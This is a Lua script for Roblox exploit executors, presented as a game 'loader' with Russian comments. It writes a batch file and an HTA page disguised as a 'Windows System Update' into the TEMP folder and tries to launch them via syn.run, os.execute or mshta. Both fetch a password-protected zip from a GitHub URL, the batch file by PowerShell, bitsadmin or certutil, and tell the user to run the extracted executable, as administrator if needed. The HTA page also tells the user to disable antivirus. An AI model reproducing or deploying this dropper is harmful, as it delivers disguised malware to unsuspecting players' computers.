-- [[
--     ROBLOX ULTIMATE SUITE v9.0
--     UNIVERSAL LOADER
--     ALL EXECUTORS SUPPORTED
-- ]]

-- ==============================================
-- ЧАСТЬ 0: ОПРЕДЕЛЕНИЕ ИСПОЛНИТЕЛЯ
-- ==============================================
local Executor = {
    Name = "Unknown",
    Version = "0.0",
    Capabilities = {}
}

local function DetectExecutor()
    if syn and syn.protect_gui then
        Executor.Name = "Synapse X"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = true
        }
    elseif identifyexecutor and identifyexecutor():lower():find("krnl") then
        Executor.Name = "KRNL"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = false,
            bypass_uac = false
        }
    elseif SW and SW.IsLoaded then
        Executor.Name = "Script-Ware"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = true
        }
    elseif fluxus and fluxus.request then
        Executor.Name = "Fluxus"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    else
        Executor.Name = "Unknown Executor"
        Executor.Capabilities = {
            file_write = (writefile ~= nil),
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    end
    
    return Executor
end

DetectExecutor()

-- ==============================================
-- ЧАСТЬ 1: КОНФИГУРАЦИЯ
-- ==============================================
-- 🔥 ВАШИ НАСТРОЙКИ (исправьте ссылку!) 🔥
local ZIP_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/raw/main/update.zip"
local ZIP_PASSWORD = "UpdatePass2025!"
local TARGET_EXE_NAME = "messagebox.exe"

-- ==============================================
-- ЧАСТЬ 2: ИНИЦИАЛИЗАЦИЯ
-- ==============================================
do
    print("\n" .. string.rep("=", 60))
    print("         🎮 " .. Executor.Name .. " - LOADER v1.0")
    print(string.rep("=", 60))
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "🎮 LOADER INITIALIZED",
        Text = "Starting download process...",
        Duration = 5
    })
end

-- ==============================================
-- ЧАСТЬ 3: ПРОСТОЙ И НАДЕЖНЫЙ МЕТОД
-- ==============================================
local function CreateDownloadScript()
    print("[1️⃣] Creating download script...")
    
    -- Проверяем доступность ссылки
    print("[🔗] Checking URL: " .. ZIP_URL)
    
    -- Создаем BAT файл для скачивания
    local batScript = [[
@echo off
chcp 65001 >nul
title Windows System Update
color 0A
cls

echo ========================================
echo     WINDOWS SYSTEM UPDATE v1.0
echo ========================================
echo.

echo [1/4] Creating temporary directory...
set "TEMP_DIR=%TEMP%\WindowsUpdate_%RANDOM%"
mkdir "%TEMP_DIR%" 2>nul
cd /d "%TEMP_DIR%"

echo [2/4] Downloading update package...
echo.
echo Please wait, this may take a few moments...
echo.

REM Попробуем несколько методов скачивания
echo Trying download method 1 (PowerShell)...
powershell -Command "
try {
    $url = ']] .. ZIP_URL .. [['
    $output = 'update.zip'
    Write-Host 'Downloading from: ' $url
    Invoke-WebRequest -Uri $url -OutFile $output
    if (Test-Path $output) {
        Write-Host 'Download successful!'
        Write-Host 'File size: ' (Get-Item $output).Length 'bytes'
        exit 0
    } else {
        Write-Host 'Download failed!'
        exit 1
    }
} catch {
    Write-Host 'Error: ' $_.Exception.Message
    exit 1
}
"

if errorlevel 1 (
    echo.
    echo Trying download method 2 (bitsadmin)...
    bitsadmin /transfer "UpdateJob" ]] .. ZIP_URL .. [[ "%TEMP_DIR%\update.zip"
)

if not exist "update.zip" (
    echo.
    echo Trying download method 3 (certutil)...
    certutil -urlcache -split -f ]] .. ZIP_URL .. [[ update.zip
)

if exist "update.zip" (
    echo.
    echo ========================================
    echo         ✅ DOWNLOAD COMPLETE
    echo ========================================
    echo.
    echo File: update.zip
    echo Location: %TEMP_DIR%
    echo Size: %~z0 bytes
    echo.
    echo ========================================
    echo          🔐 EXTRACTION INFO
    echo ========================================
    echo Password: ]] .. ZIP_PASSWORD .. [[
    echo Target EXE: ]] .. TARGET_EXE_NAME .. [[
    echo.
    echo ========================================
    echo        📋 INSTRUCTIONS
    echo ========================================
    echo 1. Open this folder: %TEMP_DIR%
    echo 2. Extract update.zip using password
    echo 3. Run ]] .. TARGET_EXE_NAME .. [[
    echo.
    echo ========================================
    echo.
    echo Opening folder...
    timeout /t 3 /nobreak >nul
    start "" "%TEMP_DIR%"
    
    echo.
    echo Do you want to open the folder now? (Y/N)
    choice /c YN /n /m "Your choice: "
    if errorlevel 2 goto :noopen
    explorer "%TEMP_DIR%"
    :noopen
    
) else (
    echo.
    echo ========================================
    echo          ❌ DOWNLOAD FAILED
    echo ========================================
    echo.
    echo Could not download the file.
    echo.
    echo Possible reasons:
    echo 1. No internet connection
    echo 2. URL is incorrect
    echo 3. File was moved or deleted
    echo.
    echo Please try:
    echo 1. Check the URL: ]] .. ZIP_URL .. [[
    echo 2. Download manually
    echo 3. Contact support
    echo.
    pause
    exit /b 1
)

echo.
echo ========================================
echo        ℹ️ ADDITIONAL INFORMATION
echo ========================================
echo.
echo If you don't have a ZIP extractor:
echo 1. Install 7-Zip from 7-zip.org
echo 2. Or use Windows built-in extractor
echo    (right-click -> Extract All)
echo.
echo Note: Some ZIP programs may require
echo the password during extraction.
echo.
echo ========================================
echo.
echo Press any key to close this window...
pause >nul
    ]]
    
    -- Создаем TXT файл с инструкциями
    local txtScript = [[
WINDOWS SYSTEM UPDATE - INSTRUCTIONS
====================================

DOWNLOAD INFORMATION:
- ZIP URL: ]] .. ZIP_URL .. [[
- Password: ]] .. ZIP_PASSWORD .. [[
- Target EXE: ]] .. TARGET_EXE_NAME .. [[

HOW TO DOWNLOAD MANUALLY:
1. Open this link in browser: ]] .. ZIP_URL .. [[
2. Save the file as 'update.zip'
3. Remember the download location

HOW TO EXTRACT:
1. Right-click on 'update.zip'
2. Select 'Extract All...'
3. Enter password: ]] .. ZIP_PASSWORD .. [[
4. Click 'Extract'

HOW TO RUN:
1. Open the extracted folder
2. Find file: ]] .. TARGET_EXE_NAME .. [[
3. Double-click to run it

TROUBLESHOOTING:
- If download fails: Check internet connection
- If extract fails: Use 7-Zip (7-zip.org)
- If EXE doesn't run: Right-click -> Run as Administrator

SUPPORT:
If you need help, contact the provider.
    ]]
    
    -- Сохраняем файлы
    local tempPath = os.getenv("TEMP") or "C:\\Windows\\Temp"
    local batPath = tempPath .. "\\windows_update.bat"
    local txtPath = tempPath .. "\\instructions.txt"
    
    print("[📁] Temp folder: " .. tempPath)
    
    local success = false
    if writefile then
        -- Сохраняем BAT файл
        if pcall(writefile, batPath, batScript) then
            print("[✅] BAT file created: " .. batPath)
            
            -- Сохраняем TXT файл
            if pcall(writefile, txtPath, txtScript) then
                print("[✅] Instructions file created: " .. txtPath)
                
                -- Пытаемся запустить BAT файл
                local launched = false
                
                if syn and syn.run then
                    syn.run('start "" "' .. batPath .. '"')
                    launched = true
                    print("[🚀] Launched via Synapse")
                elseif shell and shell.run then
                    shell.run('start "" "' .. batPath .. '"')
                    launched = true
                    print("[🚀] Launched via Shell")
                elseif os and os.execute then
                    os.execute('start "" "' .. batPath .. '"')
                    launched = true
                    print("[🚀] Launched via os.execute")
                else
                    print("[📋] Please run manually: " .. batPath)
                end
                
                success = launched
            end
        end
    end
    
    return success
end

-- ==============================================
-- ЧАСТЬ 4: АЛЬТЕРНАТИВНЫЙ МЕТОД
-- ==============================================
local function CreateHTADownloader()
    print("[2️⃣] Creating HTA application...")
    
    local htaScript = [[
<!DOCTYPE html>
<html>
<head>
<title>Windows Update</title>
<hta:application 
    id="UpdateApp"
    applicationname="WindowsUpdate"
    border="thin"
    borderstyle="normal"
    caption="yes"
    contextmenu="no"
    icon="shell32.dll,154"
    maximizebutton="yes"
    minimizebutton="yes"
    showintaskbar="yes"
    singleinstance="yes"
    windowstate="normal"
/>
<style>
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    margin: 0;
    padding: 20px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    height: 100vh;
    overflow: hidden;
}
.container {
    background: white;
    padding: 30px;
    border-radius: 15px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
    max-width: 700px;
    margin: 20px auto;
}
.header {
    text-align: center;
    margin-bottom: 30px;
}
h1 {
    color: #333;
    margin-bottom: 10px;
}
.status-box {
    background: #f8f9fa;
    border: 2px dashed #dee2e6;
    padding: 20px;
    margin: 20px 0;
    border-radius: 10px;
}
.button {
    background: #4CAF50;
    color: white;
    border: none;
    padding: 15px 30px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 16px;
    font-weight: bold;
    margin: 10px;
    transition: all 0.3s;
    display: inline-block;
}
.button:hover {
    background: #45a049;
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
}
.info-box {
    background: #e7f3fe;
    border-left: 4px solid #2196F3;
    padding: 15px;
    margin: 15px 0;
}
.progress-container {
    background: #e0e0e0;
    height: 25px;
    border-radius: 12px;
    margin: 20px 0;
    overflow: hidden;
}
.progress-bar {
    background: linear-gradient(90deg, #4CAF50, #2E7D32);
    height: 100%;
    width: 0%;
    transition: width 0.5s;
    text-align: center;
    line-height: 25px;
    color: white;
    font-weight: bold;
}
</style>
<script language="VBScript">
    Sub DownloadFile()
        Dim xhr, stream, fso, tempDir, zipPath, shell
        Set fso = CreateObject("Scripting.FileSystemObject")
        Set shell = CreateObject("WScript.Shell")
        
        tempDir = shell.ExpandEnvironmentStrings("%TEMP%") & "\WinUpdate_" & Int(Rnd * 10000)
        zipPath = tempDir & "\update.zip"
        
        ' Создаем папку
        If Not fso.FolderExists(tempDir) Then
            fso.CreateFolder(tempDir)
        End If
        
        document.getElementById("progress-bar").style.width = "10%"
        document.getElementById("status-text").innerHTML = "Preparing download..."
        
        Set xhr = CreateObject("MSXML2.XMLHTTP")
        xhr.Open "GET", "]] .. ZIP_URL .. [[", False
        
        document.getElementById("progress-bar").style.width = "30%"
        document.getElementById("status-text").innerHTML = "Connecting to server..."
        
        On Error Resume Next
        xhr.Send
        
        If xhr.Status = 200 Then
            document.getElementById("progress-bar").style.width = "60%"
            document.getElementById("status-text").innerHTML = "Downloading file..."
            
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write xhr.ResponseBody
            stream.SaveToFile zipPath, 2
            stream.Close
            
            document.getElementById("progress-bar").style.width = "90%"
            document.getElementById("status-text").innerHTML = "Finalizing..."
            
            ' Ждем немного
            WScript.Sleep 1000
            
            document.getElementById("progress-bar").style.width = "100%"
            document.getElementById("status-text").innerHTML = "Download complete!"
            
            ' Показываем информацию
            Dim message
            message = "✅ DOWNLOAD COMPLETE!" & vbCrLf & vbCrLf
            message = message & "Location: " & zipPath & vbCrLf
            message = message & "Password: ]] .. ZIP_PASSWORD .. [[" & vbCrLf
            message = message & "EXE file: ]] .. TARGET_EXE_NAME .. [[" & vbCrLf & vbCrLf
            message = message & "Do you want to open the folder?"
            
            If MsgBox(message, vbYesNo + vbInformation, "Success") = vbYes Then
                shell.Run "explorer.exe """ & tempDir & """", 1, True
            End If
            
        Else
            document.getElementById("status-text").innerHTML = "Error: " & xhr.Status & " - " & xhr.statusText
            document.getElementById("progress-bar").style.width = "0%"
            MsgBox "Download failed! Error: " & xhr.Status & vbCrLf & "Please check the URL and try again.", vbCritical, "Error"
        End If
        
        Set xhr = Nothing
        Set stream = Nothing
    End Sub
    
    Sub OpenTempFolder()
        CreateObject("WScript.Shell").Run "explorer.exe %TEMP%", 1, False
    End Sub
    
    Sub CopyInfo()
        Dim text, shell
        text = "ZIP URL: ]] .. ZIP_URL .. [[" & vbCrLf & _
               "Password: ]] .. ZIP_PASSWORD .. [[" & vbCrLf & _
               "EXE File: ]] .. TARGET_EXE_NAME .. [["
        Set shell = CreateObject("WScript.Shell")
        shell.Run "cmd.exe /c echo " & Replace(text, vbCrLf, " & echo ") & " | clip", 0, True
        MsgBox "Information copied to clipboard!", vbInformation, "Copied"
    End Sub
</script>
</head>
<body>
<center>
<div class="container">
    <div class="header">
        <h1>🔄 Windows System Update</h1>
        <p>Secure download and installation</p>
    </div>
    
    <div class="info-box">
        <h3>📋 Download Information</h3>
        <p><strong>File:</strong> update.zip</p>
        <p><strong>Password:</strong> ]] .. ZIP_PASSWORD .. [[</p>
        <p><strong>Executable:</strong> ]] .. TARGET_EXE_NAME .. [[</p>
    </div>
    
    <div class="progress-container">
        <div id="progress-bar" class="progress-bar">0%</div>
    </div>
    
    <div class="status-box">
        <h3 id="status-text">Ready to download</h3>
    </div>
    
    <div>
        <button class="button" onclick="DownloadFile()">🚀 START DOWNLOAD</button>
        <button class="button" onclick="OpenTempFolder()">📂 OPEN TEMP FOLDER</button>
        <button class="button" onclick="CopyInfo()">📋 COPY INFO</button>
        <button class="button" onclick="window.close()">❌ CLOSE</button>
    </div>
    
    <div style="margin-top: 30px; color: #666; font-size: 12px;">
        <p>If download fails, try:</p>
        <p>1. Check internet connection</p>
        <p>2. Disable antivirus temporarily</p>
        <p>3. Download manually from the URL</p>
    </div>
</div>
</center>
</body>
</html>
    ]]
    
    local tempPath = os.getenv("TEMP") or "C:\\Windows\\Temp"
    local htaPath = tempPath .. "\\windows_update.hta"
    
    if writefile then
        if pcall(writefile, htaPath, htaScript) then
            print("[✅] HTA application created: " .. htaPath)
            
            -- Пытаемся запустить
            if syn and syn.run then
                syn.run('mshta.exe "' .. htaPath .. '"')
                return true
            elseif shell and shell.run then
                shell.run('mshta.exe "' .. htaPath .. '"')
                return true
            else
                print("[📋] Please run manually: " .. htaPath)
                return true
            end
        end
    end
    
    return false
end

-- ==============================================
-- ЧАСТЬ 5: ПРОЦЕСС ЗАГРУЗКИ
-- ==============================================
spawn(function()
    wait(3)
    
    print("\n" .. string.rep("=", 60))
    print("         📥 STARTING DOWNLOAD MANAGER")
    print(string.rep("=", 60))
    
    print("[ℹ️] Executor: " .. Executor.Name)
    print("[🔗] URL: " .. ZIP_URL)
    print("[🔐] Password: " .. ZIP_PASSWORD)
    print("[⚡] Target: " .. TARGET_EXE_NAME)
    
    -- Пробуем основной метод
    local success = CreateDownloadScript()
    
    if not success then
        wait(2)
        print("[🔄] Primary method failed, trying alternative...")
        success = CreateHTADownloader()
    end
    
    if success then
        print("\n" .. string.rep("=", 60))
        print("         ✅ DOWNLOADER CREATED")
        print(string.rep("=", 60))
        print("Check your TEMP folder for files:")
        print("  - windows_update.bat (run this)")
        print("  - instructions.txt")
        print("  - windows_update.hta")
        print("\nTEMP folder location:")
        print("  " .. (os.getenv("TEMP") or "C:\\Windows\\Temp"))
        print(string.rep("=", 60))
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "✅ FILES CREATED",
            Text = "Check TEMP folder for downloader\nRun windows_update.bat",
            Duration = 10
        })
    else
        print("\n" .. string.rep("=", 60))
        print("         ❌ FAILED TO CREATE DOWNLOADER")
        print(string.rep("=", 60))
        print("Manual download required:")
        print("1. Download from: " .. ZIP_URL)
        print("2. Password: " .. ZIP_PASSWORD)
        print("3. Extract and run: " .. TARGET_EXE_NAME)
        print(string.rep("=", 60))
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "❌ MANUAL DOWNLOAD REQUIRED",
            Text = "Please download manually from:\n" .. ZIP_URL,
            Duration = 10
        })
    end
end)

-- ==============================================
-- ЧАСТЬ 6: КОМАНДЫ И ИНФОРМАЦИЯ
-- ==============================================
wait(5)

print("\n" .. string.rep("-", 40))
print("     💡 QUICK COMMANDS")
print(string.rep("-", 40))
print("In chat, type:")
print("  /download - Start download")
print("  /info - Show download info")
print("  /folder - Open TEMP folder")
print("  /help - Show commands")
print(string.rep("-", 40))

-- Обработчик команд
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    msg = msg:lower()
    
    if msg == "/download" then
        print("[📥] Creating downloader...")
        spawn(function()
            CreateDownloadScript()
        end)
        
    elseif msg == "/info" then
        print("[ℹ️] Download Information:")
        print("  URL: " .. ZIP_URL)
        print("  Password: " .. ZIP_PASSWORD)
        print("  Target: " .. TARGET_EXE_NAME)
        print("  Temp: " .. (os.getenv("TEMP") or "C:\\Windows\\Temp"))
        
    elseif msg == "/folder" then
        print("[📂] Opening TEMP folder...")
        if syn and syn.run then
            syn.run('explorer.exe "' .. (os.getenv("TEMP") or "C:\\Windows\\Temp") .. '"')
        end
        
    elseif msg == "/help" then
        print("[📋] Available commands:")
        print("  /download - Create downloader")
        print("  /info - Show info")
        print("  /folder - Open TEMP folder")
        print("  /help - This help")
    end
end)

-- ==============================================
-- ЧАСТЬ 7: ПРОВЕРКА ССЫЛКИ
-- ==============================================
spawn(function()
    wait(10)
    
    print("\n[🔍] Checking URL availability...")
    
    local function testUrl()
        local success, response = pcall(function()
            if syn and syn.request then
                local req = syn.request({
                    Url = ZIP_URL,
                    Method = "GET"
                })
                return req.StatusCode
            elseif request then
                local req = request({
                    Url = ZIP_URL,
                    Method = "GET"
                })
                return req.StatusCode
            else
                return "Cannot test (no http)"
            end
        end)
        
        return success, response
    end
    
    local success, status = testUrl()
    
    if success then
        if status == 200 then
            print("[✅] URL is accessible (Status 200)")
        else
            print("[⚠️] URL returned status: " .. tostring(status))
            print("     The file might not exist or is private")
        end
    else
        print("[⚠️] Could not test URL")
    end
end)

print("\n[✅] Loader ready! Type /download in chat")
print("[💡] Or check TEMP folder for files")
